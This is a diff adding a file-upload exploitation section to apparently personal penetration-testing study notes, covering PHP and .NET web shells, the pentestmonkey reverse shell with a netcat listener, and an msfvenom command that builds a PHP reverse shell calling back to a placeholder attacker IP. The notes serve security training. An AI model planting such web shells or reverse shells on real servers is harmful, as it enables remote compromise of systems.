@@ -74,3 +74,43 @@ we could also use a script with something like `<?php echo system('hostname'); ?
 
 ![](Images/Pasted%20image%2020240207184236.png)
 
+## Upload Exploitation 
+
+### Web shells 
+
+there are many web shells online that have different features/purposes   
+PHP has `phpbash` which provides a terminal-like, semi-interactive web shell   
+SecLists also has web shells for different frameworks and languages in `/opt/useful/SecLists/Web-Shells`
+
+### Writing custom web shell 
+
+for php we can use `system()` to execute system commands and print their output  
+then we can use `cmd` with `$_REQUEST['cmd']`  
+then when we visit our script on the app we can execute system commands with `?cmd=<command>`
+
+remember that sometimes viewing the output in the source may be better 
+
+for .NET apps we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function and it should execute the command in `?cmd=` 
+
+### Reverse shell 
+
+a reliable reverse shell for PHP is `pentestmonkey`, but SecLists also has some 
+
+to use pentestmonkey we can download the shell then edit in our target's IP and port, then we can start a netcat listener on our machine with the specified port with `nc -lnvp <port>`
+
+### Generating custom reverse shell scripts 
+
+always better to use core web framework functions to connect to our machine 
+
+`msfvenom` can generate reverse shell scripts for many languages and might even try to bypass restrictions in place 
+
+`msfvenom -p php/revers_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
+
+then we can again set up a listener with netcat and visit the uploaded file 
+
+
+`-p` - payloads  
+`-f` - specify output language
+
+reverse shells are always preferred over web shells because they have the most interactive method for controlling the compromised server, but they might not always work  
+
